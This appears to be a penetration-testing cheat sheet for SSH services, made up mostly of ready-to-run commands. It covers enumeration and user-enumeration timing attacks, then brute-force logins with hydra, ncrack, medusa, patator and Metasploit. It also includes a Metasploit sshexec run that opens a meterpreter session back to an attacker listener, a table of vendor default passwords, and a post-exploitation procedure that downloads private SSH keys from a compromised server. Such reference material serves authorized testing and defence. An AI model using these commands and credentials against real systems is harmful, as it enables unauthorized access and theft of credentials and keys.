---
description: ( TCP 22 )
---

# SSH

## Enumeration

```
nmap -Pn -n 127.0.0.1 --script ssh-hostkey
nmap -Pn -n 127.0.0.1 --script ssh-publickey-acceptance
nmap -Pn -n 127.0.0.1 --script ssh-run

# weak cipher algorithms
nmap -Pn -n --script ssh2-enum-algos 127.0.0.1
nmap -Pn -n --script ssh-auth-methods 127.0.0.1

# bruteforce
nmap -Pn -n --script ssh-brute 127.0.0.1
```

## Testing Connection and Version

#### attempt to connect to see if there is a banner when connecting

```
auxiliary/scanner/ssh/ssh_version
telnet [ip] [port]
nc -nv [ip] 22
```

also ssh login banners might be helpful some times.

## User Enumeration Timing Attack

In some versions of OpenSSH you can make a timing attack to enumerate users. You can use a metasploit module in order to exploit this:

```
msf> use scanner/ssh/ssh_enumusers
```

### Automated SSH Audit

{% embed url="https://github.com/jtesta/ssh-audit" %}

Basic server auditing:

```
ssh-audit localhost
ssh-audit 127.0.0.1
ssh-audit 127.0.0.1:222
ssh-audit ::1
ssh-audit [::1]:222
```

To run a standard audit against many servers (place targets into servers.txt, one on each line in the format of `HOST[:PORT]`):

```
ssh-audit -T servers.txt
```

To audit a client configuration (listens on port 2222 by default; connect using `ssh -p 2222 anything@localhost`):

```
ssh-audit -c
```

To audit a client configuration, with a listener on port 4567:

```
ssh-audit -c -p 4567
```

To list all official built-in policies (hint: use resulting policy names with `-P`/`--policy`):

```
ssh-audit -L
```

To run a policy audit against a server:

```
ssh-audit -P ["policy name" | path/to/server_policy.txt] targetserver
```

To run a policy audit against a client:

```
ssh-audit -c -P ["policy name" | path/to/client_policy.txt]
```

To run a policy audit against many servers:

```
ssh-audit -T servers.txt -P ["policy name" | path/to/server_policy.txt]
```

To create a policy based on a target server (which can be manually edited):

```
ssh-audit -M new_policy.txt targetserver
```

## **Login B**rute Force

```
hydra -l [user] -P [wordlist] [ip] ssh
ncrack -v -T 5 --user [user] -P [wordlist] [ip]:22
medusa -h [ip] [ip] -u [user] -P [wordlist] -M ssh
patator ssh_login host=192.168.56.103 user=FILE0 0=user password=/usr/share/wordlists/rockyou.txt

use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.75.130
set USERPASS_FILE /home/pentesting/password.txt
set VERBOSE True
set USERNAME root
run
```

## **SSH User Code Execution**

This module connects to the target system and executes the necessary commands to run the specified payload via SSH. If a native payload is specified, an appropriate stager will be used. Thus we gave host IP along with username and password, if everything goes in right then we get meterpreter session on our listening machine.

```
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) >set rhosts 192.168.1.103
msf exploit(sshexec) >set username ignite
msf exploit(sshexec) >set password 123
msf exploit(sshexec) >set srvhost 192.168.1.107
msf exploit(sshexec) >exploit
```

as a result you can observe that we have meterpreter session of the host machine.

![](<../../.gitbook/assets/image (283).png>)

## Default Credentials

{% embed url="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials" %}

```
ls /usr/share/seclists/Passwords/Default-Credentials/
```

| **Vendor** | **Usernames**                                                                                               | **Passwords**                                                                                                                                                                                              |
| ---------- | ----------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC        | apc, device                                                                                                 | apc                                                                                                                                                                                                        |
| Brocade    | admin                                                                                                       | admin123, password, brocade, fibranne                                                                                                                                                                      |
| Cisco      | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                           | admin, Admin123, default, password, secur4u, cisco, Cisco, \_Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change\_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix     | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                            | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                       |
| D-Link     | admin, user                                                                                                 | private, admin, user                                                                                                                                                                                       |
| Dell       | root, user1, admin, vkernel, cli                                                                            | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                         |
| EMC        | admin, root, sysadmin                                                                                       | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                              |
| HP/3Com    | admin, root, vcx, app, spvar, manage, hpsupport, opc\_op                                                    | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC\_op, !manage, !admin                                                   |
| Huawei     | admin, root                                                                                                 | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                             |
| IBM        | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                               |
| Juniper    | netscreen                                                                                                   | netscreen                                                                                                                                                                                                  |
| NetApp     | admin                                                                                                       | netapp123                                                                                                                                                                                                  |
| Oracle     | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                           | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                      |
| VMware     | vi-admin, root, hqadmin, vmware, admin                                                                      | vmware, vmw@re, hqadmin, default                                                                                                                                                                           |



## Stealing SSH Keys (post)

This attack requires a compromised server with SSH server running. If you are able to compromise a server with Metasploit and server has SSH running but require a key to connect with it. in that situation, you can steal the keys from the compromised server.

```
use post/multi/gather/ssh_creds
set session 4
exploit
```

Once you have compromised the server with Metasploit then run it in the background and run the above post exploit within your Metasploit and set your exploited server session id.

![](<../../.gitbook/assets/image (277).png>)

![](<../../.gitbook/assets/image (272).png>)

Once you find that you can get the key for that you have to start the session and download the key.

```
session 4
cd /home/username/.ssh
download id_rsa /home/
```

Once the key is downloaded you can find it in **`/home`** the directory. If you have the key then you can use it to connect with it as we saw earlier. There are lots of other things you can do with SSH you can check Metasploit `use auxiliary/scanner/ssh` to list all the options available.

## SSH 2.0 Version Fuzzer

```
msf > use auxiliary/fuzzers/ssh/ssh_version_2
msf auxiliary(ssh_version_2) > show actions
    ...actions...
msf auxiliary(ssh_version_2) > set ACTION < action-name >
msf auxiliary(ssh_version_2) > show options
    ...show and set options...
msf auxiliary(ssh_version_2) > run
```
